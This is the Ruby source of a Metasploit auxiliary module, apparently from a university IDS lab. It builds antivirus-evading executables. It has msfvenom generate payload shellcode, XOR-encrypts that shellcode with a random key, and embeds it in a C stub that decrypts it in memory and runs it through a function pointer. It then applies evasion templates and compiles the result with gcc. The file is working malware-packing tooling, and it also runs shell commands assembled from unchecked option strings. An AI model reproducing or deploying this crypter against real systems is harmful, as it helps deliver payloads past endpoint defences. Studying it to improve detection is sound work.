##
# evasion_applicator.rb
# Evasion technique applicator module for Metasploit 3
# Aubrey Alston (ada2145@columbia.edu)
#
# (This module and reliant files must be placed into Metasploit modules directory.)
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'fileutils'

class Metasploit3 < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IDS Antivirus Analysis Evasion Technique Applicator',
      'Description'    => %q{
        Applies a permutation of antivirus analysis evasion techniques
        to a Metasploit payload.
      },
      'Author'         => [ 'Aubrey Alston, IDS Laboratory, Columbia University (ada2145@columbia.edu)' ],
      'License'        => MSF_LICENSE
    ))
    register_options(
    [
      OptBool.new('LIST_TECHNIQUES', [true, 'If true, causes module to simply output available evasion techniques.', true]),
      OptString.new('PAYLOAD', [ false, 'Set payload to which to apply evasion techniques. (required)' ]),
      OptString.new('PAYLOAD_OPTIONS', [false, 'Set payload options.', ""]),
      OptString.new('OUTPUT_DIRECTORY', [ false, 'Directory to which to output executable. (required)' ]),
      OptString.new('EXECUTABLE_NAME', [ false, 'Name of executable to output. (required)']),
      OptString.new('EVASION_STACK', [ false, 'Semi-colon-separated list of evasion techniques to apply.', ""]),
      OptString.new('MSFVENOM_PATH', [ false, 'Path to msfvenom.', ""])
    ], self.class)
  end

  # Equivalent 'main' subroutuine for the module.  This is what is executed when
  # 'run' or 'exploit' is run from the metasploit console.
  def run
    # Change the working directory to the directory of this script.
    Dir.chdir(File.dirname(__FILE__)) 

    # if LIST_TECHNIQUES is true, just output available evasion techniques.
    if datastore['LIST_TECHNIQUES'] == true
      print_available_techniques()
    else
      payload = datastore['PAYLOAD']
      payload_options = datastore['PAYLOAD_OPTIONS']
      output_directory = datastore['OUTPUT_DIRECTORY']
      executable_name = datastore['EXECUTABLE_NAME']
      evasion_stack = datastore['EVASION_STACK']
      msfvenom_path = datastore['MSFVENOM_PATH']

      if payload == nil
        print_error("PAYLOAD must be set.")
        return 
      end
      if output_directory == nil 
        print_error("OUTPUT_DIRECTORY must be set.")
        return
      end
      if executable_name == nil 
        print_error("EXECUTABLE_NAME must be set.") 
        return
      end
      if msfvenom_path == ""
        # Guess at path to msfvenom
        msfvenom_path = Dir.pwd[0..(Dir.pwd.index("pro")+3)]+"msf3/msfvenom"
        print_status("MSFVENOM_PATH not specified.  Hoping msfvenom can be found at "+msfvenom_path+".")
      end

      binary_generated = generate_binary(msfvenom_path, payload, payload_options)
      if binary_generated
        print_status("Payload binary generated successfully.")
        print_status("Generating evasive source from generated binary.")

        generate_evasive_source(evasion_stack)

        executable_generated = generate_executable(output_directory+"/"+executable_name)

        if executable_generated
          print_status("Executable successfully generated.")
        else
          print_error("Unable to generate executable.")
        end
      else
        print_error("Payload generation with msfvenom failed.")
      end

      print_status("Cleaning up temporary files.")

      if File.exist?('tmp/bin'+self.uuid+'.c')
        File.delete('tmp/bin'+self.uuid+'.c')
      end
      if File.exist?('tmp/evasive'+self.uuid+'.c')
        File.delete('tmp/evasive'+self.uuid+'.c')
      end

    end
  end

  # Prints the available evasion techniques and specification syntax.
  def print_available_techniques
    
    puts "\nAvailable techniques:"
    #Iterate through directory
    for file in Dir["evasion_techniques/**/*"] do
      puts "\n" + file.sub("evasion_techniques/","")
      puts ""
      # Print the description of each technique.
      File.open(file, "r") do |f|
        f.each_line do |line|
          if line.index("%% INCLUDE") == 0
            break
          end
          puts line
        end
      end
    end

  end

  ########### Production of output executable
  def generate_binary(msfvenom_path, payload, options)
    dirname = File.dirname("tmp")
    unless File.directory?("tmp")
      FileUtils.mkdir_p("tmp")
      print_status("tmp directory created.")
    end

    cmd = 'ruby '+msfvenom_path+' -p '+payload+' -f c '+options+' > tmp/bin'+self.uuid+'.c'

    print_status("Delegating to msfvenom to generate payload binary: ")
    print_status("    "+cmd)

    return %x[ #{cmd} ]
  end

  # Generates an evasive source built around the binary generated by
  # msfvenom, applying the specified evasion stack.
  def generate_evasive_source(evasion_stack)
    source = "tmp/bin"+self.uuid+".c"
    specified_techniques = evasion_stack.split(";")

    # Create EvasionTechnique objects for each specified technique.
    techniques = Array.new(specified_techniques.count)
    specified_techniques.each_index do |i|
      techniques[i] = EvasionTechnique.new(specified_techniques[i])
    end



    # Initialize initial program stub on on which to build the generated source.
    stub_impl = "
    void translate(char* k){
      dbuf = malloc(BUFFER_LENGTH);

      int i, n;
      i = 0; n = 0;

      for(i = 0; i < BUFFER_LENGTH; i++)
        dbuf[i] = buf[i];

      for(n = 0; n < strlen(k); n++){
        for(i = 0; i < BUFFER_LENGTH; i++){
          dbuf[i] = dbuf[i] ^ k[(n+k[n]+i) % strlen(k)];
        }
      }
    }

    void run(){
      int (*func)();
      func = (int (*)()) dbuf;
      (int)(*func)();
      free(dbuf);
    }

    "

    # Initialize program component lists/queues/stacks
    includes_list = ["stdio.h", "stdlib.h", "string.h", "Windows.h"]
    dyn_definitions = []
    # Queue of code execution prefix stubs
    dyn_exec_prefixes = ['int main(int argc, char** argv){
        HANDLE t_file;
        DWORD t_temporary;

        LPCVOID t_content = "Status: tag log created";

        t_file = CreateFile("C:/Documents and Settings/honey/My Documents/ids_taglog.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        WriteFile(t_file, t_content, strlen((const char*) t_content), &t_temporary, NULL);
    ']
    dyn_exec =
      ' 
        translate(ivk);
        run();
      '
    # Stack of code execution postfix stubs
    dyn_exec_postfixes = [" }"]

    # Populate program component lists/queues/stacks
    techniques.each do |t|
      t.includes().each do |i|
        if includes_list.include?(i) == false
          includes_list.concat([i])
        end
      end
      dyn_definitions.concat([t.definitions()])
      dyn_exec_prefixes.concat([t.exec_prefix()])
      dyn_exec_postfixes.unshift t.exec_postfix()
    end

    # Flesh out program stub using the populated program components.
    includes = ""
    includes_list.each do |i|
      includes << '#include <'+i+ ">\n"
    end
    includes << "\n"

    dyn_definitions.each do |d|
      stub_impl << d
    end
    stub_impl << "\n"

    dyn_exec_prefixes.each do |p|
      stub_impl << p
    end
    stub_impl << "\n"

    stub_impl << dyn_exec
    dyn_exec_postfixes.each do |p|
      stub_impl << p
    end
    stub_impl << "\n"

    # Copy and parse hex dump from msfvenom-generated C file
    buf_found = false
    hex_string = ""

    file = File.open(source, "r")

    file.each do |line|
      # Dump will start with 'unsigned char buf[] ='
      if not buf_found
        if line.index("unsigned char buf[]") == 0
          buf_found = true
        end
      else
        # Strip quotes, newlines, etc
        line.delete! '"'
        line.delete! '\n'
        line.delete! "\n"
        line.delete! '\\'
        line.delete! 'x'
        # Stop once a semicolon is reached
        if line.index(";") != nil
          line.delete! ';'
          hex_string += line
          break
        else
          hex_string += line
        end
      end
    end

    file.close

    # Convert to binary string
    payload_code = hex_to_bin(hex_string)

    # Generate random string to use as the key
    key = rand(36**rand(10...25)).to_s(36)

    # Encrypt binary string with key
    encrypted_code = cipher(payload_code.bytes.to_a, key.bytes.to_a)
    encrypted_code_hex = bin_to_hex(encrypted_code.pack("c*"))

    # Format C String
    encrypted_code_hex = encrypted_code_hex.gsub(/(.{2})/, '\\x\1')
    # Split formatted C String into lines.
    lines = encrypted_code_hex.scan(/.{1,#{60}}/)

    # Write evasive source to file
    file = File.open("tmp/evasive"+self.uuid+".c", 'w')
    
    file.puts includes
    file.puts '#define BUFFER_LENGTH '+"#{encrypted_code.count}"
    file.puts "unsigned char ivk[] = \""+key+"\";"
    file.puts "unsigned char buf[] = "
    lines.each_index do |i|
      if i < lines.count - 1
        file.puts '"'+lines[i]+'"'
      else
        file.puts '"'+lines[i]+'";'
      end
    end
    file.puts "unsigned char* dbuf;";
    file.puts stub_impl
    
    file.close

    print_status("Evasive source successfully generated.")

  end

  # Generates executable
  def generate_executable(target)
    cmd = 'gcc tmp/evasive'+self.uuid+'.c -o '+target

    print_status("Generating executable: "+target)
    print_status("    "+cmd)

    return %x[ #{cmd} ]
  end

  # Converts hex to binary
  def hex_to_bin(s)
    return s.scan(/../).map { |x| x.hex }.pack('c*')
  end

  # Converts binary to hex
  def bin_to_hex(s)
    return s.unpack('H*').first
  end

  ########### Evasion-related constants and definitions

  # XOR cipher used to obfuscate
  def cipher(bytes, secret)
    ctext = Array.new(bytes)

    secret.each_index do |n|
      bytes.each_index do |i|
        ctext[i] = ctext[i] ^ secret[(n+secret[n]+i) % secret.length]
      end
    end

    return ctext
  end

  # Class encapsulating the content contained in an evasion technique
  # template.
  class EvasionTechnique
    # Initializes an argument string in the form of evasion-name(arg1,arg2,. . .)
    def initialize(arg_string)
      # Parse the name and arguments from the argument string.
      arg_string = arg_string.gsub(/\t/,"").gsub(/\)/,"").split("(")
      @name = arg_string[0]
      @args = arg_string[1] != nil ? arg_string[1].split(",") : []
      @args = @args.map { |arg| arg.strip }
      
      @includes = []
      @definitions = ""
      @prefix = ""
      @postfix = ""

      # If the file exists, open and parse the include, definitions, prefix,
      # and postfix sections.
      # Clarifications:
      #    include section: contains any required header files for the
      #                     contained template C code to work
      #    definitions    : contains any required function or constant 
      #                     definitions for following prefix/postfix
      #                     to be executed.
      #    prefix         : segment of code to be executed before decryption
      #                     and execution of payload in memory
      #    postfix        : segment of code to be executed after decryption
      #                     and execution of payload in memory
      #sections - 0 (initial), 1 (include), 2 (definitions), 3 (prefix), 4 (postfix)
      section = 0
      File.open("evasion_techniques/"+@name).each do |line|
        if line.index("%% INCLUDE") == 0
          section = 1
        elsif line.index("%% DEFINITIONS") == 0
          section = 2
        elsif line.index("%%") == 0 and section <= 2
          section = 3
        elsif line.index(">> EXECUTE")
          section = 4
        elsif line.index("%%") == 0
          break
        else
          # Parse sections and replace arguments in the form @@[argnum] can be found.
          if section == 1
            @includes.concat([line.gsub("\n","")])
          end
          if section == 2
            while line =~ /\@\@([0-9]*)/
              arg_index = ($1.to_i) - 1
              line = line.gsub(/\@\@([0-9]*)/, @args[arg_index])
            end
            @definitions += line
          end
          if section == 3
            while line =~ /\@\@([0-9]*)/
              arg_index = ($1.to_i) - 1
              line = line.gsub(/\@\@([0-9]*)/, @args[arg_index])
            end
            @prefix += line
          end
          if section == 4
            while line =~ /\@\@([0-9]*)/
              arg_index = ($1.to_i) - 1
              line = line.gsub(/\@\@([0-9]*)/, @args[arg_index])
            end
            @postfix += line
          end
        end
      end
    end
    
    # Returns the technique name
    def name() return @name end

    # Returns the technique arguments
    def args() return @args end

    # Returns the includes for this technique
    def includes() return @includes end

    # Returns the definitions for this technique
    def definitions() return @definitions end
    
    # Returns the execution prefix code for this technique
    def exec_prefix() return @prefix end
    
    # Returns the execution postfix code for this technique
    def exec_postfix() return @postfix end
  end

end